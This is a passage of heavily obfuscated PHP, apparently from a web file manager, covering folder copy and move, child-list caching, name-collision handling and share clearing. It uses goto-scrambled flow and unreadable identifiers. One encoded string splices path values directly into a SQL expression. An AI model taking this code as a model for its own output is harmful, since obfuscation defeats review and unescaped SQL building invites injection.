$this->sourceInfoCache($eŒ±×ÚËî); $c‹óİğÆ = $this->fileHistory($Fíæîñ‚Ø, $aâ¿«™·—[$Dæ‚«˜‡øˆ[441]], $aâ¿«™·—[$Dæ‚«˜‡øˆ[77]]); if ($c‹óİğÆ) { $C£ğÕ…¦µô[$Dæ‚«˜‡øˆ[524]][] = $aâ¿«™·—[$Dæ‚«˜‡øˆ[441]]; } } else { if ($f›³±®°İ¯ == REPEAT_SKIP) { } } } Hook::trigger($Dæ‚«˜‡øˆ[529], array($Dæ‚«˜‡øˆ[530], $aâ¿«™·—, 0)); } goto eÀÆßˆ½¼³; f’ÊÇ¾¼ë: } private function _copyCreate($aÛ’­÷ª½Ï, $BÄ®…•Ôµ, $fÇ’äá££, &$bİ¹‰Ø†ˆª) { goto D´âñù›ÒÍ; AÑ²––Ó­§: $this->addAll($c×¡¤ß¸¿, array(), !1); $B­‹ÙìŠÊˆ = $this->where(array($e¹ÁøÄÓ ğ[472] => $D¹Ù«¾Ö¨¼))->select(); $E¯Ñ†ÙàÒ¸ = $this->_childrenMakeRelation($E¸†°º­ƒ, $B­‹ÙìŠÊˆ); goto aÓå •×§“; A©¿®ò±Ğô: $Bğî»Ì™éÙ = $this->sourceInfo($D¹Ù«¾Ö¨¼); foreach ($E¸†°º­ƒ as $DŠÒ£®ã½—) { $d¢¿±ÁĞŞ = $this->_makeItemData($DŠÒ£®ã½—, $Bğî»Ì™éÙ, $DŠÒ£®ã½—[$e¹ÁøÄÓ ğ[28]]); $d¢¿±ÁĞŞ[$e¹ÁøÄÓ ğ[481]] = $DŠÒ£®ã½—[$e¹ÁøÄÓ ğ[481]]; $c×¡¤ß¸¿[] = $d¢¿±ÁĞŞ; } $this->chunkEventSet($e¹ÁøÄÓ ğ[534], array($e¹ÁøÄÓ ğ[535], $bÈÜ²Êöóˆ, $cÍàÍ¦Æ¿´)); goto AÑ²––Ó­§; aß‚èÛˆÖ: if ($fØÉ‰Ü›‹Š[$e¹ÁøÄÓ ğ[397]] != $e¹ÁøÄÓ ğ[86]) { $bİ¹‰Ø†ˆª[$e¹ÁøÄÓ ğ[524]][] = $fØÉ‰Ü›‹Š[$e¹ÁøÄÓ ğ[441]]; return $D¹Ù«¾Ö¨¼; } $E¸†°º­ƒ = array(); $c×¡¤ß¸¿ = array(); goto e„Ï¦•°”‚; E›„¥Ó›Åß: $this->chunkEventSet($e¹ÁøÄÓ ğ[538], array($e¹ÁøÄÓ ğ[539], $bÈÜ²Êöóˆ, $cÍàÍ¦Æ¿´)); $this->saveAll($cˆ™òÕ§ß¨); return $D¹Ù«¾Ö¨¼; goto Fê”ƒìÒ¦Û; e„Ï¦•°”‚: $this->_childrenListAll($aÛ’­÷ª½Ï, $E¸†°º­ƒ); $cÍàÍ¦Æ¿´ = count($E¸†°º­ƒ); if ($cÍàÍ¦Æ¿´ == 0) { return $D¹Ù«¾Ö¨¼; } goto A©¿®ò±Ğô; D´âñù›ÒÍ: $e¹ÁøÄÓ ğ =& $_SERVER[ÉóçÄÇ]; $fØÉ‰Ü›‹Š = $this->sourceInfoCache($aÛ’­÷ª½Ï); $Dµİ°¢æ‚Ü = $this->sourceInfoCache($BÄ®…•Ôµ); goto bçµƒ“æÖÃ; bçµƒ“æÖÃ: $bÈÜ²Êöóˆ = $this->_makeItemData($fØÉ‰Ü›‹Š, $Dµİ°¢æ‚Ü, $fÇ’äá££); Hook::trigger($e¹ÁøÄÓ ğ[531], $bÈÜ²Êöóˆ); Hook::trigger($e¹ÁøÄÓ ğ[532], array($e¹ÁøÄÓ ğ[533], $bÈÜ²Êöóˆ, 0)); goto D”ù’Ïôßï; D”ù’Ïôßï: $D¹Ù«¾Ö¨¼ = $this->add($bÈÜ²Êöóˆ); $A­Œ†‚¿‰å = array($e¹ÁøÄÓ ğ[390] => $D¹Ù«¾Ö¨¼, $e¹ÁøÄÓ ğ[28] => $fÇ’äá££); $this->_copyApplyMeta($A­Œ†‚¿‰å, $bİ¹‰Ø†ˆª); goto aß‚èÛˆÖ; A‚§Í¤ ¯: foreach ($B­‹ÙìŠÊˆ as $DŠÒ£®ã½—) { $c¾ßî¡†ù¹ = $DŠÒ£®ã½—[$e¹ÁøÄÓ ğ[390]]; $càŸ·ŠÊÀ‹ = $this->_childrenMatch($E¯Ñ†ÙàÒ¸, $DŠÒ£®ã½—, $Bğî»Ì™éÙ); $a½Ñ¾®¦›Ë[] = array($e¹ÁøÄÓ ğ[390], $c¾ßî¡†ù¹, $e¹ÁøÄÓ ğ[472], $càŸ·ŠÊÀ‹[$e¹ÁøÄÓ ğ[472]]); $cˆ™òÕ§ß¨[] = array($e¹ÁøÄÓ ğ[390], $c¾ßî¡†ù¹, $e¹ÁøÄÓ ğ[481], $càŸ·ŠÊÀ‹[$e¹ÁøÄÓ ğ[481]]); $this->_copyApplyMeta($DŠÒ£®ã½—, $bİ¹‰Ø†ˆª); if ($DŠÒ£®ã½—[$e¹ÁøÄÓ ğ[397]] != $e¹ÁøÄÓ ğ[86]) { $bİ¹‰Ø†ˆª[$e¹ÁøÄÓ ğ[524]][] = $DŠÒ£®ã½—[$e¹ÁøÄÓ ğ[441]]; } } $this->chunkEventSet($e¹ÁøÄÓ ğ[536], array($e¹ÁøÄÓ ğ[537], $bÈÜ²Êöóˆ, $cÍàÍ¦Æ¿´)); $this->saveAll($a½Ñ¾®¦›Ë); goto E›„¥Ó›Åß; aÓå •×§“: $E¯Ñ†ÙàÒ¸[$aÛ’­÷ª½Ï] = $D¹Ù«¾Ö¨¼; $a½Ñ¾®¦›Ë = array(); $cˆ™òÕ§ß¨ = array(); goto A‚§Í¤ ¯; Fê”ƒìÒ¦Û: } private function _childrenMakeRelation($fÙ‰íîªÂ, $báÌåÀ‚÷) { $Càëª‡•§ =& $_SERVER[ÉóçÄÇ]; $C‘¯Úùê¦± = array(); $dæ¤ãœµŒ = array(); foreach ($fÙ‰íîªÂ as $FïóêÅ´ÈÜ) { $cËø–Œí—“ = $FïóêÅ´ÈÜ[$Càëª‡•§[28]] . $Càëª‡•§[8] . $FïóêÅ´ÈÜ[$Càëª‡•§[481]]; $C‘¯Úùê¦±[$cËø–Œí—“] = $FïóêÅ´ÈÜ[$Càëª‡•§[390]]; } foreach ($báÌåÀ‚÷ as $FïóêÅ´ÈÜ) { $cËø–Œí—“ = $FïóêÅ´ÈÜ[$Càëª‡•§[28]] . $Càëª‡•§[8] . $FïóêÅ´ÈÜ[$Càëª‡•§[481]]; $fÚŒÇğ»ç = $C‘¯Úùê¦±[$cËø–Œí—“]; $dæ¤ãœµŒ[$fÚŒÇğ»ç] = $FïóêÅ´ÈÜ[$Càëª‡•§[390]]; } return $dæ¤ãœµŒ; } private function _childrenMatch($b°”ÁìÚ¶§, $b‚”•¥å…˜, $eÉ‡‰ŸÒ˜) { goto AÕÒˆ—ÕÀ«; E¡ ã¼§´: foreach ($b¯”±ë™¾è as $bì±ÚäßÍ¦) { if (isset($b°”ÁìÚ¶§[$bì±ÚäßÍ¦])) { $E©…æÓÄ² .= $b°”ÁìÚ¶§[$bì±ÚäßÍ¦] . $cß”Š¥‹‰Ã[540]; } } $E©…æÓÄ² = rtrim($E©…æÓÄ², $cß”Š¥‹‰Ã[47]) . $cß”Š¥‹‰Ã[47]; $dÊ°ğØÜÒÀ = $this->parentLevelArray($E©…æÓÄ²); goto D›Ïç´ÏîŸ; AÕÒˆ—ÕÀ«: $cß”Š¥‹‰Ã =& $_SERVER[ÉóçÄÇ]; $E©…æÓÄ² = $eÉ‡‰ŸÒ˜[$cß”Š¥‹‰Ã[481]]; $b¯”±ë™¾è = $this->parentLevelArray($b‚”•¥å…˜[$cß”Š¥‹‰Ã[481]]); goto E¡ ã¼§´; D›Ïç´ÏîŸ: $Fæê›…Ä¢¸ = $dÊ°ğØÜÒÀ[count($dÊ°ğØÜÒÀ) - 1]; return array($cß”Š¥‹‰Ã[472] => $Fæê›…Ä¢¸, $cß”Š¥‹‰Ã[481] => $E©…æÓÄ²); goto AÎù¨ß“‰; AÎù¨ß“‰: } private function _makeItemData($B»„“¥Òàø, $aÉŸáŞª„æ, $A“×ƒòœë‰) { $D»ÇˆÆ¼½ =& $_SERVER[ÉóçÄÇ]; $d¼Ğ˜Ä¢ÉÒ = array($D»ÇˆÆ¼½[541] => $B»„“¥Òàø[$D»ÇˆÆ¼½[397]], $D»ÇˆÆ¼½[407] => $A“×ƒòœë‰, $D»ÇˆÆ¼½[542] => $B»„“¥Òàø[$D»ÇˆÆ¼½[399]], $D»ÇˆÆ¼½[442] => $B»„“¥Òàø[$D»ÇˆÆ¼½[441]], $D»ÇˆÆ¼½[543] => $B»„“¥Òàø[$D»ÇˆÆ¼½[77]], $D»ÇˆÆ¼½[544] => $aÉŸáŞª„æ[$D»ÇˆÆ¼½[398]], $D»ÇˆÆ¼½[545] => $aÉŸáŞª„æ[$D»ÇˆÆ¼½[478]], $D»ÇˆÆ¼½[546] => USER_ID, $D»ÇˆÆ¼½[547] => USER_ID, $D»ÇˆÆ¼½[389] => $aÉŸáŞª„æ[$D»ÇˆÆ¼½[390]], $D»ÇˆÆ¼½[548] => $aÉŸáŞª„æ[$D»ÇˆÆ¼½[481]] . $aÉŸáŞª„æ[$D»ÇˆÆ¼½[390]] . $D»ÇˆÆ¼½[47], $D»ÇˆÆ¼½[416] => 0, $D»ÇˆÆ¼½[549] => $D»ÇˆÆ¼½[33]); return $d¼Ğ˜Ä¢ÉÒ; } private function _copyApplyMeta($C¿¤Âáö…, &$a½¡ãº‘Ø´) { $C¢Ÿ§Š‹Ä =& $_SERVER[ÉóçÄÇ]; $e©â“¡çÙï = $C¿¤Âáö…[$C¢Ÿ§Š‹Ä[390]]; $d‘œ‹óã±¯ = $C¿¤Âáö…[$C¢Ÿ§Š‹Ä[28]]; if (!isset($C¿¤Âáö…[$C¢Ÿ§Š‹Ä[550]]) || !$C¿¤Âáö…[$C¢Ÿ§Š‹Ä[550]] || $C¿¤Âáö…[$C¢Ÿ§Š‹Ä[550]] == $C¢Ÿ§Š‹Ä[491]) { $a½¡ãº‘Ø´[$C¢Ÿ§Š‹Ä[526]][] = array($C¢Ÿ§Š‹Ä[390], $e©â“¡çÙï, $C¢Ÿ§Š‹Ä[550], short_id($e©â“¡çÙï)); } if (Input::check($d‘œ‹óã±¯, $C¢Ÿ§Š‹Ä[551])) { $a½¡ãº‘Ø´[$C¢Ÿ§Š‹Ä[525]][] = array($C¢Ÿ§Š‹Ä[390] => $e©â“¡çÙï, $C¢Ÿ§Š‹Ä[92] => $C¢Ÿ§Š‹Ä[438], $C¢Ÿ§Š‹Ä[370] => str_replace($C¢Ÿ§Š‹Ä[50], $C¢Ÿ§Š‹Ä[33], Pinyin::encode($d‘œ‹óã±¯))); $a½¡ãº‘Ø´[$C¢Ÿ§Š‹Ä[525]][] = array($C¢Ÿ§Š‹Ä[390] => $e©â“¡çÙï, $C¢Ÿ§Š‹Ä[92] => $C¢Ÿ§Š‹Ä[437], $C¢Ÿ§Š‹Ä[370] => Pinyin::encode($d‘œ‹óã±¯, $C¢Ÿ§Š‹Ä[552])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($c˜…Ç£ç¶±) { goto dÑĞ¾·ñ; D£õí„‹: $E…»²±ÇÆå = array_to_keyvalue($E…»²±ÇÆå, $b¼¨Áš…•[390]); foreach ($E…»²±ÇÆå as $eõˆµ¼„ä‡) { $B­·Ğ‹ƒÖÅ = $eõˆµ¼„ä‡[$b¼¨Áš…•[472]]; $c˜…Ç£ç¶± = $eõˆµ¼„ä‡[$b¼¨Áš…•[390]]; if (!isset($this->_childrenListCache[$c˜…Ç£ç¶±]) && $eõˆµ¼„ä‡[$b¼¨Áš…•[397]] == $b¼¨Áš…•[86]) { $this->_childrenListCache[$c˜…Ç£ç¶±] = array(); } if (!isset($this->_childrenListCache[$B­·Ğ‹ƒÖÅ])) { $this->_childrenListCache[$B­·Ğ‹ƒÖÅ] = array(); } $this->_childrenListCache[$B­·Ğ‹ƒÖÅ][$c˜…Ç£ç¶±] = $eõˆµ¼„ä‡; $this->_childrenItemCache[$c˜…Ç£ç¶±] = $eõˆµ¼„ä‡; } goto cìÀ¦‰²ñ; a¸½·÷­‹: $b¯ë¨×é = array($b¼¨Áš…•[481] => array($b¼¨Áš…•[507], $Bö™±‡Î¬[$b¼¨Áš…•[481]] . $c˜…Ç£ç¶± . $b¼¨Áš…•[508]), $b¼¨Áš…•[417] => $this->targetIsDelete); $E…»²±ÇÆå = $this->field($bÓóÇò—íè)->where($b¯ë¨×é)->select(); if (!$E…»²±ÇÆå) { return; } goto D£õí„‹; dÑĞ¾·ñ: $b¼¨Áš…• =& $_SERVER[ÉóçÄÇ]; $Bö™±‡Î¬ = $this->sourceInfo($c˜…Ç£ç¶±); $bÓóÇò—íè = $b¼¨Áš…•[418]; goto a¸½·÷­‹; cìÀ¦‰²ñ: } private function _childrenListAll($f—­‘•Éˆâ, &$A‘ê„Æîê) { $BôØƒÂÇœÜ =& $_SERVER[ÉóçÄÇ]; if (!isset($this->_childrenListCache[$f—­‘•Éˆâ])) { return; } $e…Ü»¨Ê£œ = $this->_childrenListCache[$f—­‘•Éˆâ]; foreach ($e…Ü»¨Ê£œ as $b«¼¼¦åÂ => $Dºí—¼‡Ìƒ) { $A‘ê„Æîê[$b«¼¼¦åÂ] = $Dºí—¼‡Ìƒ; if ($Dºí—¼‡Ìƒ[$BôØƒÂÇœÜ[397]] == $BôØƒÂÇœÜ[86]) { $this->_childrenListAll($b«¼¼¦åÂ, $A‘ê„Æîê); } } } private function sourceInfoCache($aŒœ™ÛùÇ) { if (isset($this->_childrenItemCache[$aŒœ™ÛùÇ])) { return $this->_childrenItemCache[$aŒœ™ÛùÇ]; } return $this->sourceInfo($aŒœ™ÛùÇ); } private function _childrenList($bÈŒéêô˜ğ) { if (isset($this->_childrenListCache[$bÈŒéêô˜ğ])) { return $this->_childrenListCache[$bÈŒéêô˜ğ]; } return $this->_childrenListSelect($bÈŒéêô˜ğ); } private function _childrenListSelect($Eá¢ìïá‚ò) { goto a¹»‚ß¤©; a¹»‚ß¤©: $aíŠ…îç±ï =& $_SERVER[ÉóçÄÇ]; $F±Æ¬ÚÕ‰† = array($aíŠ…îç±ï[472] => $Eá¢ìïá‚ò, $aíŠ…îç±ï[417] => $this->targetIsDelete); $FÓ…é = $this->where($F±Æ¬ÚÕ‰†)->select(); goto B´‡ÓñšºÄ; B´‡ÓñšºÄ: $FÓ…é = $FÓ…é ? $FÓ…é : array(); $D‚ê¤ÃôÈ® = array_to_keyvalue($FÓ…é, $aíŠ…îç±ï[390]); $this->_childrenListCache[$Eá¢ìïá‚ò] = $D‚ê¤ÃôÈ®; goto eß¯¿ê‡¿; eß¯¿ê‡¿: foreach ($D‚ê¤ÃôÈ® as $Eá¢ìïá‚ò => $d™Š±ËÑ) { $this->_childrenItemCache[$Eá¢ìïá‚ò] = $d™Š±ËÑ; } return $D‚ê¤ÃôÈ®; goto B…‡å™ëšï; B…‡å™ëšï: } private function fileNameExistCache($CÂ–ßØŠ, $b‘Ã¤ê½¿) { $CÑ…Ÿ†ğí =& $_SERVER[ÉóçÄÇ]; $b‘Ã¤ê½¿ = strtolower($b‘Ã¤ê½¿); $añ”£Ó½ÜŠ = $this->_childrenList($CÂ–ßØŠ); foreach ($añ”£Ó½ÜŠ as $aÒ‡ºÄ¸µÈ) { if ($b‘Ã¤ê½¿ == strtolower($aÒ‡ºÄ¸µÈ[$CÑ…Ÿ†ğí[28]])) { return $aÒ‡ºÄ¸µÈ[$CÑ…Ÿ†ğí[390]]; } } return !1; } private function fileNameAutoCache($Aïß‚…ùÏã, $fù½Ê“‡—, $EŠÀ§§¡Åî, $Cõñƒåñ‹İ) { $e§ïƒšß =& $_SERVER[ÉóçÄÇ]; $CÜí¬º»£¸ = $this->_childrenList($Aïß‚…ùÏã); $fÃ–£…Ù¬ = array_to_keyvalue($CÜí¬º»£¸, $e§ïƒšß[33], $e§ïƒšß[28]); return $this->fileNameAutoGet($fÃ–£…Ù¬, $fù½Ê“‡—, $EŠÀ§§¡Åî, $Cõñƒåñ‹İ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($DŠçàôñÚ, $EïË­ñ«ç, $dÕÆ½ğâˆµ = REPEAT_REPLACE, $EÊÕø‰ö‚î = '') { goto FƒÌ£ê»Ãó; bƒ¶ªŒ‡ÁÉ: return $F¦ï–ù¦‹Š; goto bÌ»…Æ‘ñÂ; b¤Ìõö‚Û‰: if ($d«¦Öä™ŠÀ[$aƒ¼—œ¸„‰[472]] == $F»íƒ¶˜è[$aƒ¼—œ¸„‰[390]]) { if ($d«¦Öä™ŠÀ[$aƒ¼—œ¸„‰[417]] == $aƒ¼—œ¸„‰[86]) { Model($aƒ¼—œ¸„‰[415])->restore(array($DŠçàôñÚ)); } if (!$EÊÕø‰ö‚î || $EÊÕø‰ö‚î == $d«¦Öä™ŠÀ[$aƒ¼—œ¸„‰[28]]) { return $DŠçàôñÚ; } } $d¸“Ñøåò = $this->pathInfoMore($DŠçàôñÚ); if ($this->isParentOf($DŠçàôñÚ, $EïË­ñ«ç)) { return !1; } goto cÂƒ£¸ã²¸; cÂƒ£¸ã²¸: if (!$d«¦Öä™ŠÀ || !$F»íƒ¶˜è || $F»íƒ¶˜è[$aƒ¼—œ¸„‰[397]] != $aƒ¼—œ¸„‰[86]) { return !1; } Hook::trigger($aƒ¼—œ¸„‰[553], $d¸“Ñøåò); $this->targetIsDelete = intval($d«¦Öä™ŠÀ[$aƒ¼—œ¸„‰[417]]); goto aí­Öğ£îÒ; FƒÌ£ê»Ãó: $aƒ¼—œ¸„‰ =& $_SERVER[ÉóçÄÇ]; $d«¦Öä™ŠÀ = $this->sourceInfo($DŠçàôñÚ); $F»íƒ¶˜è = $this->sourceInfo($EïË­ñ«ç); goto b¤Ìõö‚Û‰; B¾À‡×ƒ: $this->lockMoveEnd($DŠçàôñÚ); $this->lockWriteEnd($EïË­ñ«ç, $DİÜŸù¼˜±); $this->folderSizeReset($d«¦Öä™ŠÀ[$aƒ¼—œ¸„‰[472]]); goto EùÍù™Ä¦Ù; A„‡­›ù: $this->lockWriteStart($EïË­ñ«ç, $DİÜŸù¼˜±); $b¦¸³Ûñ—… = array($aƒ¼—œ¸„‰[524] => array(), $aƒ¼—œ¸„‰[555] => !1); $this->clearShare($DŠçàôñÚ, $EïË­ñ«ç); goto Bæ¬É·ç¸ñ; EùÍù™Ä¦Ù: $this->folderSizeReset($EïË­ñ«ç); $dòôÚ°É½ = array($d«¦Öä™ŠÀ[$aƒ¼—œ¸„‰[472]], $EïË­ñ«ç); if ($d«¦Öä™ŠÀ[$aƒ¼—œ¸„‰[397]] == $aƒ¼—œ¸„‰[86]) { $dòôÚ°É½[] = $DŠçàôñÚ; } goto BÎßçÒ›­; aí­Öğ£îÒ: if ($d«¦Öä™ŠÀ[$aƒ¼—œ¸„‰[472]] == $EïË­ñ«ç && $EÊÕø‰ö‚î != $d«¦Öä™ŠÀ[$aƒ¼—œ¸„‰[28]]) { $E…ÈÈí¤‰‚ = $this->fileNameExist($EïË­ñ«ç, $EÊÕø‰ö‚î); if ($E…ÈÈí¤‰‚ && $d«¦Öä™ŠÀ[$aƒ¼—œ¸„‰[397]] == $aƒ¼—œ¸„‰[491]) { goto BòšÀ’ÍŒ; AÇ‘ñ”ÃÓ·: $this->removeNow($DŠçàôñÚ, !1); $this->folderSizeReset($EïË­ñ«ç); Hook::trigger($aƒ¼—œ¸„‰[554], $d¸“Ñøåò); goto c²ğñÀ±š³; c²ğñÀ±š³: return $E…ÈÈí¤‰‚; goto b´’’ …ø¬; BòšÀ’ÍŒ: $c‹ïåùÒÀÒ = $this->sourceInfo($E…ÈÈí¤‰‚); $aØ±ƒë›„ = $this->fileHistory($c‹ïåùÒÀÒ, $d«¦Öä™ŠÀ[$aƒ¼—œ¸„‰[441]], $d«¦Öä™ŠÀ[$aƒ¼—œ¸„‰[77]]); if (!$aØ±ƒë›„) { Model($aƒ¼—œ¸„‰[444])->remove($d«¦Öä™ŠÀ[$aƒ¼—œ¸„‰[441]]); } goto AÇ‘ñ”ÃÓ·; b´’’ …ø¬: } } $DİÜŸù¼˜± = $EÊÕø‰ö‚î ? $EÊÕø‰ö‚î : $d«¦Öä™ŠÀ[$aƒ¼—œ¸„‰[28]]; $this->lockMoveStart($DŠçàôñÚ); goto A„‡­›ù; BÎßçÒ›­: $this->updateModifyTime($dòôÚ°É½); Model($aƒ¼—œ¸„‰[528])->eventMove($DŠçàôñÚ, $d«¦Öä™ŠÀ[$aƒ¼—œ¸„‰[472]], $EïË­ñ«ç); Hook::trigger($aƒ¼—œ¸„‰[554], $d¸“Ñøåò); goto bƒ¶ªŒ‡ÁÉ; Bæ¬É·ç¸ñ: $FŒÔ¹•êŞ« = $this->fileNameExistCache($EïË­ñ«ç, $d«¦Öä™ŠÀ[$aƒ¼—œ¸„‰[28]]); $F¦ï–ù¦‹Š = $this->_move($DŠçàôñÚ, $EïË­ñ«ç, $dÕÆ½ğâˆµ, $b¦¸³Ûñ—…, $EÊÕø‰ö‚î); $this->sourceCacheClear(); goto EôâËÄÃ; EôâËÄÃ: if ($d«¦Öä™ŠÀ[$aƒ¼—œ¸„‰[397]] == $aƒ¼—œ¸„‰[86] && $FŒÔ¹•êŞ«) { $this->folderSizeResetChildren($F¦ï–ù¦‹Š); } Model($aƒ¼—œ¸„‰[173])->linkAdd($b¦¸³Ûñ—…[$aƒ¼—œ¸„‰[524]]); if ($FŒÔ¹•êŞ« && $b¦¸³Ûñ—…[$aƒ¼—œ¸„‰[555]]) { $this->removeNow($DŠçàôñÚ, !1); } goto B¾À‡×ƒ; bÌ»…Æ‘ñÂ: } private function _move($e£œ’‘±•, $A‰´Á¯Óˆ, $fÖ¶ÜàÁî, &$F»ÏØŸ¿öå, $Eƒ¥Ô’ÇÏ’ = '') { goto AÌì“…‚º±; eÖãÅ¡»ˆÆ: return $EˆŞï×Î¬ê; goto Aè·×ÔÕó; AÌì“…‚º±: $fñ»Ó«‡Œè =& $_SERVER[ÉóçÄÇ]; $e–Îô„Ã½á = $this->sourceInfo($e£œ’‘±•); $B­á’“Ç×‰ = $e–Îô„Ã½á[$fñ»Ó«‡Œè[397]] == $fñ»Ó«‡Œè[86]; goto eóÑ£¶ƒ©½; a³‚âíÇÆ¦: $CÅó¿¯¾ = !1; if ($B­á’“Ç×‰) { if ($fÖ¶ÜàÁî == REPEAT_RENAME_FOLDER) { $EŒâƒï‹²™ = $this->fileNameAuto($A‰´Á¯Óˆ, $EŒâƒï‹²™, $fÖ¶ÜàÁî, $B­á’“Ç×‰); $EˆŞï×Î¬ê = $this->_moveForce($e£œ’‘±•, $A‰´Á¯Óˆ, $EŒâƒï‹²™); } else { if ($fÖ¶ÜàÁî == REPEAT_RENAME_FOLDER) { $fÖ¶ÜàÁî = REPEAT_RENAME; } $e“ÜçóÏ£É = $this->_childrenListSelect($e£œ’‘±•); foreach ($e“ÜçóÏ£É as $bƒã°ƒ¾ëˆ) { $this->_move($bƒã°ƒ¾ëˆ[$fñ»Ó«‡Œè[390]], $e‘Ë‰“ÇôÈ, $fÖ¶ÜàÁî, $F»ÏØŸ¿öå); } $CÅó¿¯¾ = !0; } } else { if ($fÖ¶ÜàÁî == REPEAT_SKIP) { $CÅó¿¯¾ = !0; } else { if ($fÖ¶ÜàÁî == REPEAT_RENAME || $fÖ¶ÜàÁî == REPEAT_RENAME_FOLDER) { $EŒâƒï‹²™ = $this->fileNameAuto($A‰´Á¯Óˆ, $EŒâƒï‹²™, $fÖ¶ÜàÁî, $B­á’“Ç×‰); $EˆŞï×Î¬ê = $this->_moveForce($e£œ’‘±•, $A‰´Á¯Óˆ, $EŒâƒï‹²™); } else { if ($fÖ¶ÜàÁî == REPEAT_REPLACE) { $D‡‘ñÓÉ²Í = $this->sourceInfoCache($e‘Ë‰“ÇôÈ); $dÌ–œ » = $this->fileHistory($D‡‘ñÓÉ²Í, $e–Îô„Ã½á[$fñ»Ó«‡Œè[441]], $e–Îô„Ã½á[$fñ»Ó«‡Œè[77]]); if ($dÌ–œ ») { $F»ÏØŸ¿öå[$fñ»Ó«‡Œè[524]][] = $e–Îô„Ã½á[$fñ»Ó«‡Œè[441]]; } else { $CÅó¿¯¾ = !0; } } } } } if ($CÅó¿¯¾ && !$F»ÏØŸ¿öå[$fñ»Ó«‡Œè[555]]) { $F»ÏØŸ¿öå[$fñ»Ó«‡Œè[555]] = !0; } goto eÖãÅ¡»ˆÆ; E Ãõî‘““: $this->lockWriteStart($A‰´Á¯Óˆ, $EŒâƒï‹²™); if (!$e‘Ë‰“ÇôÈ) { return $this->_moveForce($e£œ’‘±•, $A‰´Á¯Óˆ, $EŒâƒï‹²™); } $EˆŞï×Î¬ê = $e‘Ë‰“ÇôÈ; goto a³‚âíÇÆ¦; eóÑ£¶ƒ©½: $EŒâƒï‹²™ = $Eƒ¥Ô’ÇÏ’ ? $Eƒ¥Ô’ÇÏ’ : $e–Îô„Ã½á[$fñ»Ó«‡Œè[28]]; $e‘Ë‰“ÇôÈ = $this->fileNameExistCache($A‰´Á¯Óˆ, $EŒâƒï‹²™); $this->lockMoveStart($e£œ’‘±•); goto E Ãõî‘““; Aè·×ÔÕó: } private function _moveForce($aÂÖ½àƒíÔ, $FåŠÒÉ‚İ„, $c¸¼¤ õÌÑ) { goto e÷‚çè¼¯š; AÇßĞÃ™­: $F¡Ö…ƒöò· = $A¸ç¡»¸è[$CßÇ°êöà‹[397]] == $CßÇ°êöà‹[86]; $fšÄ“Ù¸Ôğ = array($CßÇ°êöà‹[389] => $Eá¯íæã¨á[$CßÇ°êöà‹[390]], $CßÇ°êöà‹[548] => $Eá¯íæã¨á[$CßÇ°êöà‹[481]] . $Eá¯íæã¨á[$CßÇ°êöà‹[390]] . $CßÇ°êöà‹[47], $CßÇ°êöà‹[544] => $Eá¯íæã¨á[$CßÇ°êöà‹[398]], $CßÇ°êöà‹[545] => $Eá¯íæã¨á[$CßÇ°êöà‹[478]], $CßÇ°êöà‹[547] => USER_ID, $CßÇ°êöà‹[407] => $c¸¼¤ õÌÑ); $AµÈòÛß§£ = $A¸ç¡»¸è[$CßÇ°êöà‹[398]] == SourceModel::TYPE_GROUP && $Eá¯íæã¨á[$CßÇ°êöà‹[398]] == SourceModel::TYPE_GROUP && $A¸ç¡»¸è[$CßÇ°êöà‹[478]] == $Eá¯íæã¨á[$CßÇ°êöà‹[478]]; goto FÁ›åÉæË‰; FÁ›åÉæË‰: if (!$AµÈòÛß§£ && $this->moveClearAuth) { Model($CßÇ°êöà‹[476])->authClear($aÂÖ½àƒíÔ); } $E„œÆ¹µ˜¥ = $A¸ç¡»¸è[$CßÇ°êöà‹[417]] == $CßÇ°êöà‹[86] && $Eá¯íæã¨á[$CßÇ°êöà‹[417]] != $CßÇ°êöà‹[86]; if ($E„œÆ¹µ˜¥) { $fšÄ“Ù¸Ôğ[$CßÇ°êöà‹[416]] = 0; } goto AÂİÂ‘õØ; e÷‚çè¼¯š: $CßÇ°êöà‹ =& $_SERVER[ÉóçÄÇ]; $A¸ç¡»¸è = $this->sourceInfo($aÂÖ½àƒíÔ); $Eá¯íæã¨á = $this->sourceInfo($FåŠÒÉ‚İ„); goto AÇßĞÃ™­; AÂİÂ‘õØ: if ($F¡Ö…ƒöò·) { $a ‘ÂÔÏ‚ = array($CßÇ°êöà‹[548] => array($CßÇ°êöà‹[507], $A¸ç¡»¸è[$CßÇ°êöà‹[481]] . $A¸ç¡»¸è[$CßÇ°êöà‹[390]] . $CßÇ°êöà‹[508])); $eš¤ç£‰½Å = $A¸ç¡»¸è[$CßÇ°êöà‹[481]] . $A¸ç¡»¸è[$CßÇ°êöà‹[390]] . $CßÇ°êöà‹[47]; $aÓŠŞ¿‹Öí = $Eá¯íæã¨á[$CßÇ°êöà‹[481]] . $Eá¯íæã¨á[$CßÇ°êöà‹[390]] . $CßÇ°êöà‹[47] . $A¸ç¡»¸è[$CßÇ°êöà‹[390]] . $CßÇ°êöà‹[47]; $cÈèÁØ˜ê = array($CßÇ°êöà‹[548] => array($CßÇ°êöà‹[556], "\162\145\160\154\x61\143\x65\50\160\x61\162\145\156\x74\x4c\145\166\x65\154\54\47{$eš¤ç£‰½Å}\x27\54\47{$aÓŠŞ¿‹Öí}\x27\51"), $CßÇ°êöà‹[544] => $Eá¯íæã¨á[$CßÇ°êöà‹[398]], $CßÇ°êöà‹[545] => $Eá¯íæã¨á[$CßÇ°êöà‹[478]]); if ($E„œÆ¹µ˜¥) { $cÈèÁØ˜ê[$CßÇ°êöà‹[416]] = 0; } $this->where($a ‘ÂÔÏ‚)->data($cÈèÁØ˜ê)->save(); } $this->where(array($CßÇ°êöà‹[404] => $aÂÖ½àƒíÔ))->data($fšÄ“Ù¸Ôğ)->save(); return $aÂÖ½àƒíÔ; goto aóÜÎŒõ±×; aóÜÎŒõ±×: } private function clearShare($bãš…¤†ìç, $c÷ƒ·Ü‘Æ ) { goto C‹«èº‰®ß; BŒÛ…¹åÏì: Model($dƒ„¨ÆÈ˜˜[558])->where($aëºëÀ±›ô)->save(array($dƒ„¨ÆÈ˜˜[469] => 0)); Model($dƒ„¨ÆÈ˜˜[559])->where($aëºëÀ±›ô)->delete(); goto B°æ‹²œ¹; fÀš±Î·å¶: if ($FÈÎï¬ …Í[$dƒ„¨ÆÈ˜˜[478]] == $f×†½Ô¡¸Š[$dƒ„¨ÆÈ˜˜[478]] && $FÈÎï¬ …Í[$dƒ„¨ÆÈ˜˜[398]] == 